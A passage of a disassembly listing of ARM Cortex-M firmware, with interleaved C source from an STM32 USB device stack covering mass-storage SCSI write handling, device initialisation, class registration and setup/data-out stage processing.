 800af9e:	bf28      	it	cs
 800afa0:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800afa4:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800afa6:	4b07      	ldr	r3, [pc, #28]	; (800afc4 <SCSI_ProcessWrite+0x150>)
 800afa8:	7819      	ldrb	r1, [r3, #0]
 800afaa:	68fb      	ldr	r3, [r7, #12]
 800afac:	f103 0210 	add.w	r2, r3, #16
 800afb0:	68bb      	ldr	r3, [r7, #8]
 800afb2:	6878      	ldr	r0, [r7, #4]
 800afb4:	f002 f84c 	bl	800d050 <USBD_LL_PrepareReceive>
  }

  return 0;
 800afb8:	2300      	movs	r3, #0
}
 800afba:	4618      	mov	r0, r3
 800afbc:	3714      	adds	r7, #20
 800afbe:	46bd      	mov	sp, r7
 800afc0:	bd90      	pop	{r4, r7, pc}
 800afc2:	bf00      	nop
 800afc4:	2000010b 	.word	0x2000010b

0800afc8 <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800afc8:	b480      	push	{r7}
 800afca:	b087      	sub	sp, #28
 800afcc:	af00      	add	r7, sp, #0
 800afce:	60f8      	str	r0, [r7, #12]
 800afd0:	60b9      	str	r1, [r7, #8]
 800afd2:	4613      	mov	r3, r2
 800afd4:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800afd6:	88fb      	ldrh	r3, [r7, #6]
 800afd8:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800afda:	68fb      	ldr	r3, [r7, #12]
 800afdc:	2b00      	cmp	r3, #0
 800afde:	d102      	bne.n	800afe6 <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800afe0:	f04f 33ff 	mov.w	r3, #4294967295
 800afe4:	e013      	b.n	800b00e <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800afe6:	8afa      	ldrh	r2, [r7, #22]
 800afe8:	68fb      	ldr	r3, [r7, #12]
 800afea:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800afec:	e00b      	b.n	800b006 <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800afee:	8afb      	ldrh	r3, [r7, #22]
 800aff0:	3b01      	subs	r3, #1
 800aff2:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800aff4:	8afb      	ldrh	r3, [r7, #22]
 800aff6:	68ba      	ldr	r2, [r7, #8]
 800aff8:	441a      	add	r2, r3
 800affa:	8afb      	ldrh	r3, [r7, #22]
 800affc:	7811      	ldrb	r1, [r2, #0]
 800affe:	68fa      	ldr	r2, [r7, #12]
 800b000:	4413      	add	r3, r2
 800b002:	460a      	mov	r2, r1
 800b004:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800b006:	8afb      	ldrh	r3, [r7, #22]
 800b008:	2b00      	cmp	r3, #0
 800b00a:	d1f0      	bne.n	800afee <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800b00c:	2300      	movs	r3, #0
}
 800b00e:	4618      	mov	r0, r3
 800b010:	371c      	adds	r7, #28
 800b012:	46bd      	mov	sp, r7
 800b014:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b018:	4770      	bx	lr

0800b01a <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800b01a:	b580      	push	{r7, lr}
 800b01c:	b086      	sub	sp, #24
 800b01e:	af00      	add	r7, sp, #0
 800b020:	60f8      	str	r0, [r7, #12]
 800b022:	60b9      	str	r1, [r7, #8]
 800b024:	4613      	mov	r3, r2
 800b026:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800b028:	68fb      	ldr	r3, [r7, #12]
 800b02a:	2b00      	cmp	r3, #0
 800b02c:	d101      	bne.n	800b032 <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800b02e:	2303      	movs	r3, #3
 800b030:	e01f      	b.n	800b072 <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800b032:	68fb      	ldr	r3, [r7, #12]
 800b034:	2200      	movs	r2, #0
 800b036:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800b03a:	68fb      	ldr	r3, [r7, #12]
 800b03c:	2200      	movs	r2, #0
 800b03e:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800b042:	68fb      	ldr	r3, [r7, #12]
 800b044:	2200      	movs	r2, #0
 800b046:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800b04a:	68bb      	ldr	r3, [r7, #8]
 800b04c:	2b00      	cmp	r3, #0
 800b04e:	d003      	beq.n	800b058 <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800b050:	68fb      	ldr	r3, [r7, #12]
 800b052:	68ba      	ldr	r2, [r7, #8]
 800b054:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b058:	68fb      	ldr	r3, [r7, #12]
 800b05a:	2201      	movs	r2, #1
 800b05c:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800b060:	68fb      	ldr	r3, [r7, #12]
 800b062:	79fa      	ldrb	r2, [r7, #7]
 800b064:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800b066:	68f8      	ldr	r0, [r7, #12]
 800b068:	f001 fdb6 	bl	800cbd8 <USBD_LL_Init>
 800b06c:	4603      	mov	r3, r0
 800b06e:	75fb      	strb	r3, [r7, #23]

  return ret;
 800b070:	7dfb      	ldrb	r3, [r7, #23]
}
 800b072:	4618      	mov	r0, r3
 800b074:	3718      	adds	r7, #24
 800b076:	46bd      	mov	sp, r7
 800b078:	bd80      	pop	{r7, pc}

0800b07a <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800b07a:	b580      	push	{r7, lr}
 800b07c:	b084      	sub	sp, #16
 800b07e:	af00      	add	r7, sp, #0
 800b080:	6078      	str	r0, [r7, #4]
 800b082:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800b084:	2300      	movs	r3, #0
 800b086:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800b088:	683b      	ldr	r3, [r7, #0]
 800b08a:	2b00      	cmp	r3, #0
 800b08c:	d101      	bne.n	800b092 <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800b08e:	2303      	movs	r3, #3
 800b090:	e025      	b.n	800b0de <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800b092:	687b      	ldr	r3, [r7, #4]
 800b094:	683a      	ldr	r2, [r7, #0]
 800b096:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800b09a:	687b      	ldr	r3, [r7, #4]
 800b09c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b0a0:	687b      	ldr	r3, [r7, #4]
 800b0a2:	32ae      	adds	r2, #174	; 0xae
 800b0a4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b0a8:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800b0aa:	2b00      	cmp	r3, #0
 800b0ac:	d00f      	beq.n	800b0ce <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800b0ae:	687b      	ldr	r3, [r7, #4]
 800b0b0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b0b4:	687b      	ldr	r3, [r7, #4]
 800b0b6:	32ae      	adds	r2, #174	; 0xae
 800b0b8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b0bc:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800b0be:	f107 020e 	add.w	r2, r7, #14
 800b0c2:	4610      	mov	r0, r2
 800b0c4:	4798      	blx	r3
 800b0c6:	4602      	mov	r2, r0
 800b0c8:	687b      	ldr	r3, [r7, #4]
 800b0ca:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800b0ce:	687b      	ldr	r3, [r7, #4]
 800b0d0:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800b0d4:	1c5a      	adds	r2, r3, #1
 800b0d6:	687b      	ldr	r3, [r7, #4]
 800b0d8:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800b0dc:	2300      	movs	r3, #0
}
 800b0de:	4618      	mov	r0, r3
 800b0e0:	3710      	adds	r7, #16
 800b0e2:	46bd      	mov	sp, r7
 800b0e4:	bd80      	pop	{r7, pc}

0800b0e6 <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800b0e6:	b580      	push	{r7, lr}
 800b0e8:	b082      	sub	sp, #8
 800b0ea:	af00      	add	r7, sp, #0
 800b0ec:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800b0ee:	6878      	ldr	r0, [r7, #4]
 800b0f0:	f001 fdca 	bl	800cc88 <USBD_LL_Start>
 800b0f4:	4603      	mov	r3, r0
}
 800b0f6:	4618      	mov	r0, r3
 800b0f8:	3708      	adds	r7, #8
 800b0fa:	46bd      	mov	sp, r7
 800b0fc:	bd80      	pop	{r7, pc}

0800b0fe <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800b0fe:	b480      	push	{r7}
 800b100:	b083      	sub	sp, #12
 800b102:	af00      	add	r7, sp, #0
 800b104:	6078      	str	r0, [r7, #4]
  return ret;
#else
  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800b106:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800b108:	4618      	mov	r0, r3
 800b10a:	370c      	adds	r7, #12
 800b10c:	46bd      	mov	sp, r7
 800b10e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b112:	4770      	bx	lr

0800b114 <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800b114:	b580      	push	{r7, lr}
 800b116:	b084      	sub	sp, #16
 800b118:	af00      	add	r7, sp, #0
 800b11a:	6078      	str	r0, [r7, #4]
 800b11c:	460b      	mov	r3, r1
 800b11e:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800b120:	2300      	movs	r3, #0
 800b122:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800b124:	687b      	ldr	r3, [r7, #4]
 800b126:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b12a:	2b00      	cmp	r3, #0
 800b12c:	d009      	beq.n	800b142 <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800b12e:	687b      	ldr	r3, [r7, #4]
 800b130:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b134:	681b      	ldr	r3, [r3, #0]
 800b136:	78fa      	ldrb	r2, [r7, #3]
 800b138:	4611      	mov	r1, r2
 800b13a:	6878      	ldr	r0, [r7, #4]
 800b13c:	4798      	blx	r3
 800b13e:	4603      	mov	r3, r0
 800b140:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800b142:	7bfb      	ldrb	r3, [r7, #15]
}
 800b144:	4618      	mov	r0, r3
 800b146:	3710      	adds	r7, #16
 800b148:	46bd      	mov	sp, r7
 800b14a:	bd80      	pop	{r7, pc}

0800b14c <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800b14c:	b580      	push	{r7, lr}
 800b14e:	b084      	sub	sp, #16
 800b150:	af00      	add	r7, sp, #0
 800b152:	6078      	str	r0, [r7, #4]
 800b154:	460b      	mov	r3, r1
 800b156:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800b158:	2300      	movs	r3, #0
 800b15a:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800b15c:	687b      	ldr	r3, [r7, #4]
 800b15e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b162:	685b      	ldr	r3, [r3, #4]
 800b164:	78fa      	ldrb	r2, [r7, #3]
 800b166:	4611      	mov	r1, r2
 800b168:	6878      	ldr	r0, [r7, #4]
 800b16a:	4798      	blx	r3
 800b16c:	4603      	mov	r3, r0
 800b16e:	2b00      	cmp	r3, #0
 800b170:	d001      	beq.n	800b176 <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800b172:	2303      	movs	r3, #3
 800b174:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800b176:	7bfb      	ldrb	r3, [r7, #15]
}
 800b178:	4618      	mov	r0, r3
 800b17a:	3710      	adds	r7, #16
 800b17c:	46bd      	mov	sp, r7
 800b17e:	bd80      	pop	{r7, pc}

0800b180 <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800b180:	b580      	push	{r7, lr}
 800b182:	b084      	sub	sp, #16
 800b184:	af00      	add	r7, sp, #0
 800b186:	6078      	str	r0, [r7, #4]
 800b188:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800b18a:	687b      	ldr	r3, [r7, #4]
 800b18c:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b190:	6839      	ldr	r1, [r7, #0]
 800b192:	4618      	mov	r0, r3
 800b194:	f001 f8a7 	bl	800c2e6 <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800b198:	687b      	ldr	r3, [r7, #4]
 800b19a:	2201      	movs	r2, #1
 800b19c:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800b1a0:	687b      	ldr	r3, [r7, #4]
 800b1a2:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800b1a6:	461a      	mov	r2, r3
 800b1a8:	687b      	ldr	r3, [r7, #4]
 800b1aa:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800b1ae:	687b      	ldr	r3, [r7, #4]
 800b1b0:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b1b4:	f003 031f 	and.w	r3, r3, #31
 800b1b8:	2b02      	cmp	r3, #2
 800b1ba:	d01a      	beq.n	800b1f2 <USBD_LL_SetupStage+0x72>
 800b1bc:	2b02      	cmp	r3, #2
 800b1be:	d822      	bhi.n	800b206 <USBD_LL_SetupStage+0x86>
 800b1c0:	2b00      	cmp	r3, #0
 800b1c2:	d002      	beq.n	800b1ca <USBD_LL_SetupStage+0x4a>
 800b1c4:	2b01      	cmp	r3, #1
 800b1c6:	d00a      	beq.n	800b1de <USBD_LL_SetupStage+0x5e>
 800b1c8:	e01d      	b.n	800b206 <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800b1ca:	687b      	ldr	r3, [r7, #4]
 800b1cc:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b1d0:	4619      	mov	r1, r3
 800b1d2:	6878      	ldr	r0, [r7, #4]
 800b1d4:	f000 fad4 	bl	800b780 <USBD_StdDevReq>
 800b1d8:	4603      	mov	r3, r0
 800b1da:	73fb      	strb	r3, [r7, #15]
      break;
 800b1dc:	e020      	b.n	800b220 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800b1de:	687b      	ldr	r3, [r7, #4]
 800b1e0:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b1e4:	4619      	mov	r1, r3
 800b1e6:	6878      	ldr	r0, [r7, #4]
 800b1e8:	f000 fb3c 	bl	800b864 <USBD_StdItfReq>
 800b1ec:	4603      	mov	r3, r0
 800b1ee:	73fb      	strb	r3, [r7, #15]
      break;
 800b1f0:	e016      	b.n	800b220 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800b1f2:	687b      	ldr	r3, [r7, #4]
 800b1f4:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b1f8:	4619      	mov	r1, r3
 800b1fa:	6878      	ldr	r0, [r7, #4]
 800b1fc:	f000 fb9e 	bl	800b93c <USBD_StdEPReq>
 800b200:	4603      	mov	r3, r0
 800b202:	73fb      	strb	r3, [r7, #15]
      break;
 800b204:	e00c      	b.n	800b220 <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800b206:	687b      	ldr	r3, [r7, #4]
 800b208:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b20c:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800b210:	b2db      	uxtb	r3, r3
 800b212:	4619      	mov	r1, r3
 800b214:	6878      	ldr	r0, [r7, #4]
 800b216:	f001 fe13 	bl	800ce40 <USBD_LL_StallEP>
 800b21a:	4603      	mov	r3, r0
 800b21c:	73fb      	strb	r3, [r7, #15]
      break;
 800b21e:	bf00      	nop
  }

  return ret;
 800b220:	7bfb      	ldrb	r3, [r7, #15]
}
 800b222:	4618      	mov	r0, r3
 800b224:	3710      	adds	r7, #16
 800b226:	46bd      	mov	sp, r7
 800b228:	bd80      	pop	{r7, pc}

0800b22a <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800b22a:	b580      	push	{r7, lr}
 800b22c:	b086      	sub	sp, #24
 800b22e:	af00      	add	r7, sp, #0
 800b230:	60f8      	str	r0, [r7, #12]
 800b232:	460b      	mov	r3, r1
 800b234:	607a      	str	r2, [r7, #4]
 800b236:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800b238:	2300      	movs	r3, #0
 800b23a:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800b23c:	7afb      	ldrb	r3, [r7, #11]
 800b23e:	2b00      	cmp	r3, #0
 800b240:	d16e      	bne.n	800b320 <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800b242:	68fb      	ldr	r3, [r7, #12]
 800b244:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800b248:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800b24a:	68fb      	ldr	r3, [r7, #12]
 800b24c:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b250:	2b03      	cmp	r3, #3
 800b252:	f040 8098 	bne.w	800b386 <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800b256:	693b      	ldr	r3, [r7, #16]
 800b258:	689a      	ldr	r2, [r3, #8]
 800b25a:	693b      	ldr	r3, [r7, #16]
 800b25c:	68db      	ldr	r3, [r3, #12]
 800b25e:	429a      	cmp	r2, r3
 800b260:	d913      	bls.n	800b28a <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800b262:	693b      	ldr	r3, [r7, #16]
 800b264:	689a      	ldr	r2, [r3, #8]
 800b266:	693b      	ldr	r3, [r7, #16]
 800b268:	68db      	ldr	r3, [r3, #12]
 800b26a:	1ad2      	subs	r2, r2, r3
 800b26c:	693b      	ldr	r3, [r7, #16]
 800b26e:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800b270:	693b      	ldr	r3, [r7, #16]
 800b272:	68da      	ldr	r2, [r3, #12]
 800b274:	693b      	ldr	r3, [r7, #16]
 800b276:	689b      	ldr	r3, [r3, #8]
 800b278:	4293      	cmp	r3, r2
 800b27a:	bf28      	it	cs
 800b27c:	4613      	movcs	r3, r2
 800b27e:	461a      	mov	r2, r3
 800b280:	6879      	ldr	r1, [r7, #4]
 800b282:	68f8      	ldr	r0, [r7, #12]
 800b284:	f001 f923 	bl	800c4ce <USBD_CtlContinueRx>
 800b288:	e07d      	b.n	800b386 <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b28a:	68fb      	ldr	r3, [r7, #12]
 800b28c:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b290:	f003 031f 	and.w	r3, r3, #31
 800b294:	2b02      	cmp	r3, #2
 800b296:	d014      	beq.n	800b2c2 <USBD_LL_DataOutStage+0x98>
 800b298:	2b02      	cmp	r3, #2
 800b29a:	d81d      	bhi.n	800b2d8 <USBD_LL_DataOutStage+0xae>
 800b29c:	2b00      	cmp	r3, #0
 800b29e:	d002      	beq.n	800b2a6 <USBD_LL_DataOutStage+0x7c>
 800b2a0:	2b01      	cmp	r3, #1
 800b2a2:	d003      	beq.n	800b2ac <USBD_LL_DataOutStage+0x82>
 800b2a4:	e018      	b.n	800b2d8 <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b2a6:	2300      	movs	r3, #0
 800b2a8:	75bb      	strb	r3, [r7, #22]
            break;
 800b2aa:	e018      	b.n	800b2de <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b2ac:	68fb      	ldr	r3, [r7, #12]
 800b2ae:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b2b2:	b2db      	uxtb	r3, r3
 800b2b4:	4619      	mov	r1, r3
 800b2b6:	68f8      	ldr	r0, [r7, #12]
 800b2b8:	f000 f9d2 	bl	800b660 <USBD_CoreFindIF>
 800b2bc:	4603      	mov	r3, r0
 800b2be:	75bb      	strb	r3, [r7, #22]
            break;
 800b2c0:	e00d      	b.n	800b2de <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b2c2:	68fb      	ldr	r3, [r7, #12]
 800b2c4:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b2c8:	b2db      	uxtb	r3, r3
 800b2ca:	4619      	mov	r1, r3
 800b2cc:	68f8      	ldr	r0, [r7, #12]
 800b2ce:	f000 f9d4 	bl	800b67a <USBD_CoreFindEP>
 800b2d2:	4603      	mov	r3, r0
 800b2d4:	75bb      	strb	r3, [r7, #22]
            break;
 800b2d6:	e002      	b.n	800b2de <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b2d8:	2300      	movs	r3, #0
 800b2da:	75bb      	strb	r3, [r7, #22]
            break;
 800b2dc:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b2de:	7dbb      	ldrb	r3, [r7, #22]
 800b2e0:	2b00      	cmp	r3, #0
 800b2e2:	d119      	bne.n	800b318 <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b2e4:	68fb      	ldr	r3, [r7, #12]
 800b2e6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b2ea:	b2db      	uxtb	r3, r3
 800b2ec:	2b03      	cmp	r3, #3
 800b2ee:	d113      	bne.n	800b318 <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b2f0:	7dba      	ldrb	r2, [r7, #22]
 800b2f2:	68fb      	ldr	r3, [r7, #12]
 800b2f4:	32ae      	adds	r2, #174	; 0xae
 800b2f6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2fa:	691b      	ldr	r3, [r3, #16]
 800b2fc:	2b00      	cmp	r3, #0
 800b2fe:	d00b      	beq.n	800b318 <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b300:	7dba      	ldrb	r2, [r7, #22]
 800b302:	68fb      	ldr	r3, [r7, #12]
 800b304:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b308:	7dba      	ldrb	r2, [r7, #22]
 800b30a:	68fb      	ldr	r3, [r7, #12]
 800b30c:	32ae      	adds	r2, #174	; 0xae
 800b30e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b312:	691b      	ldr	r3, [r3, #16]
 800b314:	68f8      	ldr	r0, [r7, #12]
 800b316:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b318:	68f8      	ldr	r0, [r7, #12]
 800b31a:	f001 f8e9 	bl	800c4f0 <USBD_CtlSendStatus>
 800b31e:	e032      	b.n	800b386 <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b320:	7afb      	ldrb	r3, [r7, #11]
 800b322:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b326:	b2db      	uxtb	r3, r3
 800b328:	4619      	mov	r1, r3
 800b32a:	68f8      	ldr	r0, [r7, #12]
 800b32c:	f000 f9a5 	bl	800b67a <USBD_CoreFindEP>
 800b330:	4603      	mov	r3, r0
 800b332:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b334:	7dbb      	ldrb	r3, [r7, #22]
 800b336:	2bff      	cmp	r3, #255	; 0xff
 800b338:	d025      	beq.n	800b386 <USBD_LL_DataOutStage+0x15c>
 800b33a:	7dbb      	ldrb	r3, [r7, #22]
 800b33c:	2b00      	cmp	r3, #0
 800b33e:	d122      	bne.n	800b386 <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b340:	68fb      	ldr	r3, [r7, #12]
 800b342:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b346:	b2db      	uxtb	r3, r3
 800b348:	2b03      	cmp	r3, #3
 800b34a:	d117      	bne.n	800b37c <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b34c:	7dba      	ldrb	r2, [r7, #22]
 800b34e:	68fb      	ldr	r3, [r7, #12]
 800b350:	32ae      	adds	r2, #174	; 0xae
 800b352:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b356:	699b      	ldr	r3, [r3, #24]
 800b358:	2b00      	cmp	r3, #0
 800b35a:	d00f      	beq.n	800b37c <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b35c:	7dba      	ldrb	r2, [r7, #22]
